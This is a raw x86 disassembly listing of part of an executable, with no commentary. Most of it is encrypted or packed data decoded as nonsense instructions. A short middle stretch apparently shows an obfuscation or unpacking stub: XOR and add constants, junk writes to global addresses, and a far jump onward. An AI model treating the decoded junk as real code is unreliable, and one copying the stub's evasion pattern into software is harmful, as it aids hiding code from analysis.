  413986:	xchg   dh,al
  413988:	popa   
  413989:	(bad)  
  41398a:	dec    edi
  41398b:	in     eax,dx
  41398c:	mov    ah,0x76
  41398e:	outs   dx,BYTE PTR ds:[esi]
  41398f:	les    ecx,FWORD PTR [edi+edi*8+0x62]
  413993:	nop
  413994:	sub    DWORD PTR [edx],esp
  413996:	ja     0x413a05
  413998:	aaa    
  413999:	and    al,0xad
  41399b:	jle    0x4139fb
  41399d:	in     al,0x8c
  41399f:	inc    ecx
  4139a0:	(bad)  
  4139a1:	(bad)  
  4139a2:	ja     0x413966
  4139a4:	mov    dh,0xe9
  4139a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139a7:	pop    esi
  4139a8:	inc    esp
  4139a9:	sti    
  4139aa:	sbb    ecx,edx
  4139ac:	int3   
  4139ad:	mov    bh,0x83
  4139af:	ret    
  4139b0:	xchg   esi,eax
  4139b1:	outs   dx,BYTE PTR ds:[esi]
  4139b2:	cmp    dl,BYTE PTR ds:0x9c60d2a5
  4139b8:	fisttp QWORD PTR [eax-0x13bd1e17]
  4139be:	mov    eax,ds:0x606c608b
  4139c3:	(bad)  
  4139c4:	loope  0x413990
  4139c6:	sub    BYTE PTR [edi+0x12017225],cl
  4139cc:	push   edx
  4139cd:	pop    eax
  4139ce:	arpl   cx,ax
  4139d0:	add    BYTE PTR [edi-0x41487877],0xe2
  4139d7:	dec    BYTE PTR [eax-0x7fba22e6]
  4139dd:	mul    DWORD PTR [eax+0x29]
  4139e0:	rcl    DWORD PTR [esp+ebx*2+0x5a],0x15
  4139e5:	sub    DWORD PTR [eax-0x51],esi
  4139e8:	popa   
  4139e9:	(bad)  
  4139ea:	fcmovnbe st,st(1)
  4139ec:	aam    0x19
  4139ee:	mov    BYTE PTR [eax+0x34],bh
  4139f1:	es or  esp,eax
  4139f4:	xchg   edi,eax
  4139f5:	js     0x413a6b
  4139f7:	push   es
  4139f8:	psubusw mm5,QWORD PTR [esi+ebx*2]
  4139fc:	stos   BYTE PTR es:[edi],al
  4139fd:	jp     0x413a77
  4139ff:	push   esp
  413a00:	adc    dl,BYTE PTR [edx+eax*4-0x386303b5]
  413a07:	add    al,0x45
  413a09:	and    DWORD PTR [edx-0xee86cbf],0x7e
  413a10:	xlat   BYTE PTR ds:[ebx]
  413a11:	cmp    BYTE PTR [esi+esi*8-0x29],ah
  413a15:	scas   eax,DWORD PTR es:[edi]
  413a16:	sub    eax,0x29e6e0f7
  413a1b:	dec    esi
  413a1c:	in     eax,0xbb
  413a1e:	in     eax,0xeb
  413a20:	cmp    BYTE PTR [ecx-0x5e70a78a],al
  413a26:	je     0x4139e0
  413a28:	add    DWORD PTR [edx+0x1b142275],0xdb301bbf
  413a32:	or     ebp,DWORD PTR [edi]
  413a34:	pop    DWORD PTR [ebx+0x37]
  413a37:	lods   eax,DWORD PTR ds:[esi]
  413a38:	shl    DWORD PTR [esi+0x11],1
  413a3b:	sar    BYTE PTR [ebx],cl
  413a3d:	and    eax,edi
  413a3f:	sub    al,0xba
  413a41:	clc    
  413a42:	jae    0x4139e1
  413a44:	mov    al,0xb7
  413a46:	fimul  WORD PTR [eax-0x61a1eef5]
  413a4c:	rcl    DWORD PTR [esi],cl
  413a4e:	pop    ss
  413a4f:	dec    edi
  413a50:	xor    eax,0x4b1f6b34
  413a55:	ret    0x81b1
  413a58:	test   eax,0x5690c42b
  413a5d:	popa   
  413a5e:	mov    dl,BYTE PTR [edi-0x30]
  413a61:	mov    ch,0xe1
  413a63:	mov    ah,0x44
  413a65:	call   0x54d2:0x2bbc557
  413a6c:	out    dx,al
  413a6d:	sub    BYTE PTR ds:0xaeeba0f,bh
  413a73:	ss fcmovne st,st(4)
  413a76:	mov    ecx,edi
  413a78:	aas    
  413a79:	push   ss
  413a7a:	sti    
  413a7b:	push   es
  413a7c:	mov    bl,0x1e
  413a7e:	mul    edi
  413a80:	daa    
  413a81:	cld    
  413a82:	mov    edx,0xad7a5fa9
  413a87:	popf   
  413a88:	sbb    al,BYTE PTR [ecx+0x28d0ded0]
  413a8e:	pop    ss
  413a8f:	jmp    0x79fd:0x5a71c8e3
  413a96:	cwde   
  413a97:	sbb    al,0xd7
  413a99:	push   ds
  413a9a:	mov    dl,0x7b
  413a9c:	push   edx
  413a9d:	jl     0x413a62
  413a9f:	(bad)  
  413aa0:	retf   0x5bda
  413aa3:	sub    bl,BYTE PTR [ebx+0x60]
  413aa6:	pushf  
  413aa7:	fidiv  WORD PTR [esi]
  413aa9:	pop    edx
  413aaa:	fisttp QWORD PTR [eax-0x80]
  413aad:	test   al,0x66
  413aaf:	loope  0x413a3f
  413ab1:	in     eax,dx
  413ab2:	mov    eax,ds:0x303ea0d9
  413ab7:	sub    ebx,DWORD PTR [ecx-0x33]
  413aba:	mov    cl,0xc9
  413abc:	push   ss
  413abd:	push   edi
  413abe:	sahf   
  413abf:	fild   DWORD PTR [eiz*8-0x61e473a4]
  413ac6:	aas    
  413ac7:	inc    ecx
  413ac8:	out    0xbc,eax
  413aca:	inc    edi
  413acb:	test   al,0x8a
  413acd:	mov    ecx,0xe08175ae
  413ad2:	imul   ecx,DWORD PTR [eax],0x7
  413ad5:	in     eax,0x2c
  413ad7:	jge    0x413aab
  413ad9:	and    edx,DWORD PTR [edx]
  413adb:	jp     0x413a90
  413add:	pushf  
  413ade:	add    BYTE PTR [edx+0x78],bh
  413ae1:	add    al,BYTE PTR [esi+0x3d]
  413ae4:	outs   dx,DWORD PTR ds:[esi]
  413ae5:	lods   eax,DWORD PTR ds:[esi]
  413ae6:	inc    ebp
  413ae7:	sub    esp,ecx
  413ae9:	pop    es
  413aea:	aad    0x21
  413aec:	fisub  WORD PTR [ebx]
  413aee:	xchg   DWORD PTR [ebx+0x4d],ebx
  413af1:	nop
  413af2:	fs das 
  413af4:	inc    ecx
  413af5:	aad    0xe9
  413af7:	xchg   ebx,eax
  413af8:	aad    0x67
  413afa:	ins    DWORD PTR es:[edi],dx
  413afb:	fild   QWORD PTR [ecx]
  413afd:	sub    DWORD PTR [edx+0x29e3522c],ecx
  413b03:	mov    bh,0x71
  413b05:	mov    esi,0xcd1c5400
  413b0a:	rcr    bh,1
  413b0c:	mov    WORD PTR [ebx],fs
  413b0e:	bound  ebx,QWORD PTR [ecx-0x4]
  413b11:	fdivr  st(1),st
  413b13:	lods   eax,DWORD PTR ds:[esi]
  413b14:	lds    edx,FWORD PTR [edx]
  413b16:	fadd   DWORD PTR [edx+0x54]
  413b19:	sbb    BYTE PTR [ecx+0x5af7970c],bl
  413b1f:	iret   
  413b20:	imul   edx,edx,0x859f61b0
  413b26:	sub    al,0xb9
  413b28:	push   0xe
  413b2a:	mov    BYTE PTR [esi],dl
  413b2c:	dec    ebp
  413b2d:	outs   dx,BYTE PTR ds:[esi]
  413b2e:	or     al,0xa6
  413b30:	sub    edi,esi
  413b32:	adc    DWORD PTR [eax],0x1442ab88
  413b38:	scas   al,BYTE PTR es:[edi]
  413b39:	add    dl,BYTE PTR [edi+0x5b73f044]
  413b3f:	or     ecx,edx
  413b41:	adc    ebp,eax
  413b43:	lods   eax,DWORD PTR ds:[esi]
  413b44:	aaa    
  413b45:	lods   al,BYTE PTR ds:[esi]
  413b46:	sub    edx,DWORD PTR [ebx+0x4779e2ae]
  413b4c:	sbb    al,0x68
  413b4e:	fwait
  413b4f:	lahf   
  413b50:	ret    
  413b51:	ds cmp eax,0x913255f
  413b57:	fistp  WORD PTR [edx]
  413b59:	mov    DWORD PTR [edx],esp
  413b5b:	and    bh,al
  413b5d:	and    edi,ebx
  413b5f:	lea    ecx,[ecx-0x1ee6e9a]
  413b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b66:	sub    BYTE PTR ds:0xe4854fc1,dl
  413b6c:	or     al,0xe5
  413b6e:	ss sub al,0x95
  413b71:	cs jns 0x413bb6
  413b74:	fld    DWORD PTR [ebx-0x13555b65]
  413b7a:	(bad)  
  413b7c:	sub    esi,DWORD PTR ds:0xdd0cc855
  413b82:	sbb    eax,0x671ddab7
  413b87:	push   0x25
  413b89:	jbe    0x413b97
  413b8b:	cmp    eax,0xf3fc24a1
  413b90:	adc    ebx,DWORD PTR [edi+eiz*4]
  413b93:	call   0xfb4d6c38
  413b98:	mov    edi,DWORD PTR [ebp+0x577020eb]
  413b9e:	inc    eax
  413b9f:	les    esi,FWORD PTR ds:0xbb1415c9
  413ba5:	lds    ebx,FWORD PTR ds:0x5e92d5da
  413bab:	fs or  al,0x6f
  413bae:	add    DWORD PTR [ebx],ebp
  413bb0:	addr16 aas 
  413bb2:	add    DWORD PTR [edx+edi*8+0x48b71e8],edx
  413bb9:	jmp    0x413c0a
  413bbb:	ins    BYTE PTR es:[edi],dx
  413bbc:	ss daa 
  413bbe:	dec    ecx
  413bbf:	sbb    BYTE PTR [ebp-0xa],bh
  413bc2:	xlat   BYTE PTR ds:[ebx]
  413bc3:	ret    0x9d95
  413bc6:	mov    ds:0x2e526c83,eax
  413bcb:	inc    edx
  413bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bcd:	ins    DWORD PTR es:[edi],dx
  413bce:	loopne 0x413bce
  413bd0:	inc    edi
  413bd1:	imul   BYTE PTR [ecx-0x6b]
  413bd4:	mov    bl,0x5b
  413bd6:	xor    BYTE PTR [bp+si+0x65],bh
  413bda:	mov    bl,0xf
  413bdc:	dec    ebx
  413bdd:	ins    DWORD PTR es:[edi],dx
  413bde:	fs add al,0x5
  413be1:	ja     0x413c44
  413be3:	and    eax,DWORD PTR [edi+0x5d]
  413be6:	push   es
  413be7:	mov    ebp,0xbf058453
  413bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bed:	fist   WORD PTR [edx-0x61]
  413bf0:	fidiv  DWORD PTR fs:[ebx+0xc]
  413bf4:	jg     0x413c24
  413bf6:	mov    ebx,0xc06699fe
  413bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bfc:	imul   edx,eax,0x33671c6
  413c02:	daa    
  413c03:	jle    0x413c35
  413c05:	lea    ebx,ds:0x2cea2107
  413c0b:	(bad)  
  413c0c:	inc    edx
  413c0d:	mov    al,ds:0xe5bb2fb0
  413c12:	(bad)
  413c15:	sbb    dl,bh
  413c17:	jmp    0x56cde74c
  413c1c:	jle    0x413be3
  413c1e:	xchg   ecx,eax
  413c1f:	test   DWORD PTR [esp+eiz*4-0x1c],0xb7343eb2
  413c27:	test   cl,0xea
  413c2a:	jecxz  0x413c6f
  413c2c:	and    eax,0xb29632dd
  413c31:	scas   eax,DWORD PTR es:[edi]
  413c32:	std    
  413c33:	cs mov ebp,0xe5e4b352
  413c39:	call   0xfb47:0x17926afb
  413c40:	xchg   BYTE PTR [esi],dh
  413c42:	push   edi
  413c43:	jne    0x413bff
  413c45:	(bad)  
  413c46:	mov    esi,0x3e5d2f0a
  413c4b:	and    al,0x2a
  413c4d:	xchg   edx,eax
  413c4e:	or     ch,BYTE PTR [edi+0xd]
  413c51:	(bad)  
  413c52:	bt     edx,eax
  413c55:	retf   0x1c9d
  413c58:	pop    ss
  413c59:	jmp    0x322d:0x97f7630b
  413c60:	in     eax,dx
  413c61:	test   al,0x13
  413c63:	sub    eax,0xc085e1c2
  413c68:	xchg   DWORD PTR [ebp+0xe879489],edi
  413c6e:	int    0x46
  413c70:	push   ecx
  413c71:	cmc    
  413c72:	push   es
  413c73:	sub    BYTE PTR [ebp-0x7b4dbc1a],bh
  413c79:	mov    DWORD PTR [edx],edi
  413c7b:	inc    ch
  413c7d:	mov    ah,0xfe
  413c7f:	outs   dx,DWORD PTR ds:[esi]
  413c80:	xor    DWORD PTR [edx],ebx
  413c82:	adc    eax,0x3dc8477d
  413c87:	or     DWORD PTR [eax-0x43],esi
  413c8a:	rcr    BYTE PTR [edx-0x66],cl
  413c8d:	cmp    dl,bh
  413c8f:	clc    
  413c90:	or     eax,0xa56d96f6
  413c95:	push   ds
  413c96:	mov    BYTE PTR [ecx],cl
  413c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c99:	bound  edx,QWORD PTR [edi-0x43500557]
  413c9f:	fwait
  413ca0:	ins    DWORD PTR es:[edi],dx
  413ca1:	pslld  mm0,QWORD PTR [edx-0x41]
  413ca5:	push   0xfffffffa
  413ca7:	mov    esp,0x36ead0db
  413cac:	sbb    DWORD PTR [edx],ecx
  413cae:	push   0xffffffa4
  413cb0:	pop    esp
  413cb1:	mov    eax,ds:0x18b39a4e
  413cb6:	mov    esp,0xfdf96526
  413cbb:	xchg   ebp,eax
  413cbc:	idiv   BYTE PTR [esi]
  413cbe:	loopne 0x413d01
  413cc0:	push   ss
  413cc1:	push   cs
  413cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cc3:	retf   
  413cc4:	fst    DWORD PTR [eax]
  413cc6:	call   DWORD PTR [esi]
  413cc8:	mov    ah,0xd4
  413cca:	or     al,0xc7
  413ccc:	shl    ebx,cl
  413cce:	xor    BYTE PTR [eax+0x2363d561],dh
  413cd4:	cmc    
  413cd5:	jb     0x413d08
  413cd7:	xor    al,0x48
  413cd9:	mov    WORD PTR [edx+0x4815627e],fs
  413cdf:	jbe    0x413d1a
  413ce1:	jb     0x413cea
  413ce3:	inc    edi
  413ce4:	mov    edx,ebx
  413ce6:	add    al,0xd1
  413ce8:	or     BYTE PTR [esi],0xa8
  413ceb:	(bad)  
  413ced:	cmp    al,0xea
  413cef:	sub    BYTE PTR [edx+edi*4-0x293e9695],ch
  413cf6:	scas   eax,DWORD PTR es:[edi]
  413cf7:	sbb    BYTE PTR [edx+0x8b571bc],0x1d
  413cfe:	pop    edx
  413cff:	inc    ecx
  413d00:	sbb    eax,0xe0e11c63
  413d05:	bound  esi,QWORD PTR [eax-0x24a00e74]
  413d0b:	jmp    0x413d7f
  413d0d:	xchg   esp,eax
  413d0e:	imul   DWORD PTR [edi+0x24]
  413d11:	push   edx
  413d12:	sub    eax,0xf15fcf05
  413d17:	in     al,dx
  413d18:	add    dl,BYTE PTR [esi-0x7a7fc315]
  413d1e:	push   esp
  413d1f:	mov    bh,0x66
  413d21:	inc    ebp
  413d22:	dec    edx
  413d23:	and    al,0xd0
  413d25:	stos   BYTE PTR es:[edi],al
  413d26:	rcr    DWORD PTR [ebp-0x29],1
  413d29:	inc    ecx
  413d2a:	pusha  
  413d2b:	int3   
  413d2c:	pop    edx
  413d2d:	loopne 0x413d8c
  413d2f:	sbb    DWORD PTR [eax+edx*1-0x5d],0xa0e3fe12
  413d37:	mov    BYTE PTR [ebx],al
  413d39:	mov    DWORD PTR [edx+0x5f],0x788e2ff3
  413d40:	xchg   esp,eax
  413d41:	and    eax,0xe5d45e9a
  413d46:	pop    eax
  413d47:	cmc    
  413d48:	cmp    edx,DWORD PTR [eax]
  413d4a:	sbb    al,BYTE PTR [ebx-0x77]
  413d4d:	(bad)  
  413d4f:	add    eax,DWORD PTR [ebp-0x64]
  413d52:	add    al,0x61
  413d54:	sbb    BYTE PTR [ebp+0xb9db985],cl
  413d5a:	adc    DWORD PTR [edx+ecx*4],esi
  413d5d:	mov    esp,ebp
  413d5f:	outs   dx,DWORD PTR ds:[esi]
  413d60:	inc    ebp
  413d61:	out    dx,eax
  413d62:	mov    cl,0x16
  413d64:	outs   dx,BYTE PTR ds:[esi]
  413d65:	jg     0x413cee
  413d67:	imul   edi,DWORD PTR [edi+0x3ecce064],0x4f
  413d6e:	jmp    0x413d4f
  413d70:	cmp    eax,0xf5bf9b0b
  413d75:	xchg   ecx,eax
  413d76:	in     al,dx
  413d77:	and    esi,DWORD PTR [edi]
  413d79:	mov    esi,edx
  413d7b:	jo     0x413d86
  413d7d:	inc    ecx
  413d7e:	sub    ebx,ecx
  413d80:	xchg   ebx,ecx
  413d82:	dec    ecx
  413d83:	dec    ecx
  413d84:	mov    eax,DWORD PTR [ebp-0x1c]
  413d87:	imul   eax,ecx
  413d8a:	add    esp,eax
  413d8c:	xchg   edx,eax
  413d8d:	push   eax
  413d8e:	xor    ebx,ebx
  413d90:	mov    edx,esp
  413d92:	dec    edx
  413d93:	inc    ebx
  413d94:	add    ebx,DWORD PTR [edx+ebx*1]
  413d97:	dec    ebx
  413d98:	xor    edx,edx
  413d9a:	add    DWORD PTR [ebp-0x10],ebx
  413d9d:	pop    ebx
  413d9e:	mov    eax,DWORD PTR [ebp-0x10]
  413da1:	pop    edi
  413da2:	pop    esi
  413da3:	pop    ebx
  413da4:	leave  
  413da5:	ret    0x10
  413da8:	push   ebp
  413da9:	mov    ebp,esp
  413dab:	push   ecx
  413dac:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413db3:	sub    DWORD PTR ds:0x42a2e6,ebx
  413db9:	mov    eax,DWORD PTR [ebp-0x4]
  413dbc:	and    DWORD PTR ds:0x42a2e6,0x0
  413dc6:	jmp    0x413dd8
  413dcb:	mov    edx,DWORD PTR ds:0x42a2e6
  413dd1:	inc    edx
  413dd2:	mov    DWORD PTR ds:0x42a2e6,edx
  413dd8:	cmp    DWORD PTR ds:0x42a2e6,0x1a
  413ddf:	jae    0x413e0a
  413de5:	cmp    DWORD PTR ds:0x42a2e6,0x2a
  413dec:	ja     0x413e0a
  413df2:	jmp    0x413e05
  413df7:	push   DWORD PTR [ebp-0x10]
  413dfa:	push   0x42a27e
  413dff:	call   DWORD PTR ds:0x42a3ce
  413e05:	jmp    0x413dcb
  413e0a:	mov    edx,DWORD PTR [ebp+0x10]
  413e0d:	mov    ecx,0x75108aa
  413e12:	xor    eax,ecx
  413e14:	sbb    DWORD PTR ds:0x42a2aa,0x2976
  413e1e:	add    eax,0x3272f1
  413e23:	xor    DWORD PTR ds:0x42a272,0x42a2b6
  413e2d:	mov    DWORD PTR [edx],eax
  413e2f:	mov    eax,DWORD PTR [ebp+0xc]
  413e32:	and    edx,DWORD PTR ds:0x42a2f2
  413e38:	xor    eax,ecx
  413e3a:	and    DWORD PTR ds:0x42a2de,edi
  413e40:	push   esi
  413e41:	mov    esi,DWORD PTR [ebp+0x10]
  413e44:	mov    edx,0x3272f1
  413e49:	add    eax,edx
  413e4b:	mov    DWORD PTR [esi+0x4],eax
  413e4e:	mov    eax,DWORD PTR [ebp+0x14]
  413e51:	mov    esi,DWORD PTR [ebp+0x10]
  413e54:	mov    DWORD PTR [esi+0x8],eax
  413e57:	mov    eax,DWORD PTR [ebp+0x18]
  413e5a:	mov    esi,DWORD PTR [ebp+0x10]
  413e5d:	mov    DWORD PTR [esi+0xc],eax
  413e60:	mov    eax,DWORD PTR [ebp+0x1c]
  413e63:	mov    esi,DWORD PTR [ebp+0x10]
  413e66:	mov    DWORD PTR [esi+0x10],eax
  413e69:	mov    eax,DWORD PTR [ebp+0x8]
  413e6c:	xor    eax,ecx
  413e6e:	add    eax,edx
  413e70:	jmp    0x416225
  413e75:	mov    esi,ebx
  413e77:	push   ebx
  413e78:	push   esi
  413e79:	or     edx,esi
  413e7b:	xchg   BYTE PTR [esi+0x72f8d7bb],ch
  413e81:	add    dl,ch
  413e83:	jp     0x413e7b
  413e85:	xchg   esp,eax
  413e86:	gs jl  0x413e0c
  413e89:	jmp    0x413ee9
  413e8b:	add    DWORD PTR [ebx-0x531819f1],0x63
  413e92:	ins    BYTE PTR es:[edi],dx
  413e93:	lahf   
  413e94:	cmc    
  413e95:	loopne 0x413e9d
  413e97:	les    ebx,FWORD PTR [ebx-0x70]
  413e9a:	jno    0x413e25
  413e9c:	sbb    al,0xaa
  413e9e:	push   ds
  413e9f:	fcomp  st(4)
  413ea1:	sti    
  413ea2:	fisttp QWORD PTR [esi-0x64160811]
  413ea8:	sbb    eax,edi
  413eaa:	je     0x413efc
  413eac:	jno    0x413ef8
  413eae:	add    BYTE PTR [eax+0x14],dl
  413eb1:	idiv   DWORD PTR [edi-0x7a4fc408]
  413eb7:	dec    ecx
  413eb8:	jno    0x413ebc
  413eba:	xor    eax,0x5db2d375
  413ebf:	xor    DWORD PTR [esi+0x43f14126],0xffffffad
  413ec6:	aas    
  413ec7:	sahf   
  413ec8:	lock add dl,BYTE PTR [ecx]
  413ecb:	cmp    DWORD PTR [ecx],edi
  413ecd:	jecxz  0x413e82
  413ecf:	fcomp  QWORD PTR [eax+edi*1+0x19930673]
  413ed6:	cli    
  413ed7:	mov    ebx,0x7f49c225
  413edc:	sti    
  413edd:	in     eax,dx
  413ede:	int    0xf3
  413ee0:	dec    edx
  413ee1:	add    DWORD PTR [ebp+0x6793b923],ebx
  413ee7:	xchg   ch,dl
  413ee9:	xchg   ah,ah
  413eeb:	jno    0x413f68
  413eed:	inc    ecx
  413eee:	push   eax
  413eef:	jge    0x413eaf
  413ef1:	call   0x89cf:0x8745a3aa
  413ef8:	cmp    edi,DWORD PTR [esi+0x67]
  413efb:	mov    eax,ds:0x2d3e0510
  413f00:	ret    0x3217
  413f03:	xor    BYTE PTR [esi+0x4e314f90],0x9f
  413f0a:	jne    0x413f6b
  413f0c:	arpl   WORD PTR [ecx-0x67],cx
  413f0f:	adc    eax,0xfaaf8697
  413f14:	xchg   bh,dl
  413f16:	aam    0x6
  413f18:	loop   0x413ee1
  413f1a:	out    dx,eax
  413f1b:	cmp    al,0xe2
  413f1d:	fisttp DWORD PTR [ecx]
  413f1f:	cld    
  413f20:	adc    BYTE PTR [ecx],al
  413f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f23:	nop
  413f24:	dec    ecx
  413f25:	sti    
  413f26:	jno    0x413f0c
  413f28:	push   ebp
  413f29:	jb     0x413f9a
  413f2b:	aad    0x19
  413f2d:	xchg   esi,eax
  413f2e:	ins    DWORD PTR es:[edi],dx
  413f2f:	mov    ch,0x2f
  413f31:	jecxz  0x413fb2
  413f33:	or     al,0x8a
  413f35:	(bad)  
  413f36:	outs   dx,BYTE PTR ds:[esi]
  413f37:	mov    bl,0x0
  413f39:	add    dl,BYTE PTR [edi+0x652f9219]
  413f3f:	mov    ebp,0xf38ab462
  413f44:	add    al,0xec
  413f46:	mov    ecx,0x1497332e
  413f4b:	sbb    DWORD PTR [ebx-0x699c5a97],ebp
  413f51:	retf   0x4a26
  413f54:	sub    eax,0xb8295fc3
  413f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f5a:	xor    al,0x6a
  413f5c:	cdq    
  413f5d:	shr    DWORD PTR [ecx-0x471a9eda],cl
  413f63:	adc    ch,BYTE PTR [esi-0x20]
  413f66:	xor    DWORD PTR [ebp+0x7b],ebp
  413f69:	jo     0x413fb9
  413f6b:	xlat   BYTE PTR ds:[ebx]
  413f6c:	pusha  
  413f6d:	out    dx,al
  413f6e:	and    bh,ch
  413f70:	scas   al,BYTE PTR es:[edi]
  413f71:	xor    DWORD PTR [edx+esi*1],ecx
  413f74:	fdivr  DWORD PTR [ebp+0x5c489a67]
  413f7a:	jae    0x413fb8
  413f7c:	icebp  
  413f7d:	mov    eax,0x20d6f082
  413f82:	adc    BYTE PTR [ecx],dh
  413f84:	or     dl,BYTE PTR [edx]
  413f86:	adc    bh,BYTE PTR [eax+0x29]
  413f89:	sahf   
  413f8a:	ja     0x413f61
  413f8c:	inc    eax
  413f8d:	jno    0x413f28
  413f8f:	lods   al,BYTE PTR ds:[esi]
  413f90:	mov    eax,ds:0x379b164e
  413f95:	jne    0x413f92
  413f97:	in     al,dx
  413f98:	shl    BYTE PTR [eax],cl
  413f9a:	rcr    DWORD PTR [ebp-0xb],0xd5
  413f9e:	test   al,0x5b
  413fa0:	rcl    DWORD PTR [esi+edx*1+0x46507110],1
  413fa7:	adc    eax,0x23d5f22a
  413fac:	mov    edx,0xd3458f
  413fb1:	neg    DWORD PTR [esp+ebp*4-0x52871d64]
  413fb8:	arpl   WORD PTR [ecx-0x1a],cx
  413fbb:	sbb    eax,0xaad946c7
  413fc0:	mov    eax,ds:0x80002a56
  413fc5:	add    al,0xe7
  413fc7:	stc    
  413fc8:	iret   
  413fc9:	pop    es
  413fca:	sub    bh,al
  413fcc:	jbe    0x414005
  413fce:	mov    edx,0x4c310a2d
  413fd3:	and    DWORD PTR [esi],0x7c9ca284
  413fd9:	(bad)  
  413fda:	and    esi,DWORD PTR [esi+0x5c]
  413fdd:	push   0x72e936d7
  413fe2:	in     al,0x55
  413fe4:	jl     0x413fba
  413fe6:	add    ebx,edi
  413fe8:	mov    ecx,DWORD PTR ds:0xed86e7c
  413fee:	outs   dx,BYTE PTR ds:[esi]
  413fef:	or     DWORD PTR [ecx],0xa7c68a11
  413ff5:	and    DWORD PTR [eax+0x10a49485],esi
  413ffb:	test   eax,0xd9b747b9
  414000:	into   
  414001:	sub    DWORD PTR [edi+0x6c4c5f53],0x29
  414008:	stc    
  414009:	ins    BYTE PTR es:[edi],dx
  41400a:	inc    eax
  41400b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41400c:	sub    al,BYTE PTR [ecx]
  41400e:	iret   
  41400f:	xchg   ebx,eax
  414010:	mov    ds:0x9a802af0,al
  414015:	add    dl,ah
  414017:	arpl   ax,cx
  414019:	out    dx,al
  41401a:	shr    DWORD PTR [edx-0x5cd95b1b],cl
  414020:	xchg   esp,eax
  414021:	mov    eax,0xcf19fa62
  414026:	jns    0x414089
  414028:	mov    DWORD PTR [edi],esp
  41402a:	push   ebx
  41402b:	adc    eax,0xc8a6eb2c
  414030:	arpl   WORD PTR [esi],dx
  414032:	mov    bl,0x34
  414034:	pop    esi
  414035:	cs jb  0x414069
  414038:	mov    al,ds:0xcdd394eb
  41403d:	dec    edi
  41403e:	jno    0x41407c
  414040:	das    
  414041:	sahf   
  414042:	push   edx
  414043:	and    edx,DWORD PTR [edi]
  414045:	out    dx,al
  414046:	xor    ch,BYTE PTR [edi-0x3f4aef1]
  41404c:	(bad)  
  41404d:	bt     DWORD PTR [edi],esp
  414050:	ins    DWORD PTR es:[edi],dx
  414051:	cmp    al,0x74
  414053:	add    esi,ecx
  414055:	mov    ch,0x7d
  414057:	in     eax,0x92
  414059:	fld    DWORD PTR [ecx]
  41405b:	dec    esp
  41405c:	jecxz  0x41400f
  41405e:	pop    ebx
  41405f:	jmp    0xd46ee7f1
  414064:	pusha  
  414065:	ja     0x41403d
  414067:	cmc    
  414068:	mov    ebp,0xb44cf1a2
  41406d:	ins    DWORD PTR es:[edi],dx
  41406e:	pop    esi
  41406f:	adc    al,0xdb
  414071:	jb     0x4140b2
  414073:	jge    0x4140dc
  414075:	fs ss sbb dh,bh
  414079:	dec    ebp
  41407a:	or     DWORD PTR [ebp-0x2f7cdbde],ebp
  414080:	adc    BYTE PTR [ebp+0x41423341],0xcc
  414087:	dec    esp
  414088:	sbb    bl,cl
  41408a:	xchg   ebp,eax
  41408b:	adc    esi,0x793d55ca
  414091:	ror    DWORD PTR [edx-0x2fc556eb],0xda
  414098:	xlat   BYTE PTR ds:[ebx]
  414099:	xchg   esi,eax
  41409a:	mov    ebx,0xdd53ec8d
  41409f:	add    al,0x1c
  4140a1:	fistp  QWORD PTR [edx+0x60]
  4140a4:	mov    dl,dh
  4140a6:	mov    bh,0x10
  4140a8:	ror    DWORD PTR [ebp-0x3016ff0f],cl
  4140ae:	dec    edx
  4140af:	daa    
  4140b0:	xor    esi,edx
  4140b2:	push   0xffffff9e
  4140b4:	into   
  4140b5:	mov    ebp,0x89e9e293
  4140ba:	add    edx,ebp
  4140bc:	lods   eax,DWORD PTR ds:[esi]
  4140bd:	arpl   si,ax
  4140bf:	adc    BYTE PTR [ebp-0x10],al
  4140c2:	push   eax
  4140c3:	add    ecx,DWORD PTR [esi+eax*8-0x713abd6e]
  4140ca:	fs jae 0x414060
  4140cd:	mov    al,0x99
  4140cf:	add    ecx,DWORD PTR [edi-0x79ee01df]
  4140d5:	pop    esi
  4140d6:	push   0x52a262fa
  4140db:	das    
  4140dc:	dec    ecx
  4140dd:	shl    eax,1
  4140df:	mov    dl,0xed
  4140e1:	adc    edx,ecx
  4140e3:	jno    0x414159
  4140e5:	inc    ebx
  4140e6:	and    BYTE PTR [ebp+0x73],cl
  4140e9:	fld    st(5)
  4140eb:	jmp    0x414136
  4140ed:	rcl    BYTE PTR [esi+0x57],0x9b
  4140f1:	cmp    BYTE PTR [ebx],bl
  4140f3:	cwde   
  4140f4:	nop
  4140f5:	adc    DWORD PTR [ebp-0x42],ebx
  4140f8:	aam    0xa8
  4140fa:	adc    ebx,DWORD PTR [edx-0x5b]
  4140fd:	cdq    
  4140fe:	in     eax,0xe4
  414100:	xor    dh,BYTE PTR [eax+0x1b04f2dd]
  414106:	mov    ebp,0xda3ddd70
  41410b:	cmp    al,BYTE PTR [ebx-0x46]
  41410e:	mov    bh,0x69
  414110:	xchg   edx,edx
  414112:	pop    edi
  414113:	and    bl,bl
  414115:	retf   
  414116:	pop    es
  414117:	lock je 0x4140f1
  41411a:	hlt    
  41411b:	scas   al,BYTE PTR es:[edi]
  41411c:	inc    ecx
  41411d:	add    eax,0x12f14acb
  414122:	popf   
  414123:	adc    dl,BYTE PTR [ebx-0x37f9cdc8]
  414129:	jl     0x41419b
  41412b:	lahf   
  41412c:	std    
  41412d:	xchg   ebp,eax
  41412e:	out    dx,eax
  41412f:	loope  0x414123
  414131:	or     eax,ecx
  414133:	mov    al,ds:0x6ed3f736
  414138:	pop    ebp
  414139:	pop    edi
  41413a:	inc    edx
  41413b:	stc    
  41413c:	sbb    eax,0x14401737
  414141:	enter  0x4d59,0x95
  414145:	into   
  414146:	enter  0xfa7d,0x38
  41414a:	cmp    edx,DWORD PTR [edx-0x2a1c2c68]
  414150:	popa   
  414151:	jbe    0x4140f4
  414153:	sub    esp,esp
  414155:	xchg   ebx,eax
  414156:	jmp    FWORD PTR [eax]
  414158:	xchg   bh,dl
